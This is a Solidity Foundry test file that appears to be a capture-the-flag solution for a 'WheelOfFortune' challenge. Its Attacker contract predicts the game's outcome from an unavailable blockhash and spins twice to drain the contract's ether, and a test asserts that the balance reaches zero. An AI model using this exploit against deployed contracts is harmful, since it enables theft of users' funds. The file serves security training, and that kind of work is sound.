// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

contract Attacker {
    WheelOfFortune public instance;

    constructor(address _instanceAddr) {
        instance = WheelOfFortune(_instanceAddr);
    }

    function attack() external {
        uint256 num = uint256(keccak256(abi.encode(bytes32(0)))) % 100;

        instance.spin{value: 0.01 ether}(num);
        instance.spin{value: 0.01 ether}(0);

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
   
// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }


   function testExploitLevel() public {
       vm.deal(address(this), 1 ether);

       Attacker attacker = new Attacker(address(instance));

       payable(address(attacker)).transfer(0.02 ether);

       attacker.attack();

       checkSuccess();
   }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
